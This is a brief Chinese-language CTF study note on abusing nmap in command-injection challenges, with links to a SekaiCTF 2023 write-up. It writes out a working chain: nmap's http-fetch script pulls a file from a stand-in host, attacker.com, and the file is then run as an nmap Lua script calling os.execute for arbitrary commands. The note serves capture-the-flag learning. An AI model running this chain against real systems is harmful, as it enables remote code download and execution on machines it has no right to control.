# 文章
[nmap.md](https://www.yuque.com/attachments/yuque/0/2023/md/25358086/1693233068912-a851eda4-4471-48e4-b177-5233bc606236.md)<br />[NMAP类型题目 (escapeshellarg,escapeshellcmd使用不当) - mwkks - 博客园](https://www.cnblogs.com/xcj-djx/p/13745899.html)<br />[NMAP类型题目 (escapeshellarg,escapeshellcmd使用不当) - mwkks - 博客园.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1693233726113-d072efcc-0d50-4b93-b59f-f2307a92fcdf.pdf)
# 一些利用思路
### 思路1
开启VPS，目录下有一个名为`fiile_to_save`文件
```bash
python3 -m http.server 80
```
受害机执行以下命令下载文件
```bash
RHOST=attacker.com
RPORT=8080
TF=$(mktemp -d)
LFILE=file_to_save
nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
```
`file_to_save`内容如下
```bash
os.execute("执行任意命令")
```
受害机执行以下命令进行命令执行
```bash
nmap --script=/tmp/<ip>/<port>/file_to_save
```
#### 例题
[[SekaiCTF 2023]Scanner-Service](https://learn-cyber.net/writeup/Scanner-Service)<br />[Scanner Service - LearnCyber.pdf](https://www.yuque.com/attachments/yuque/0/2023/pdf/25358086/1693233517896-b2543978-d4a8-4491-a3fa-4faf638f75c4.pdf)
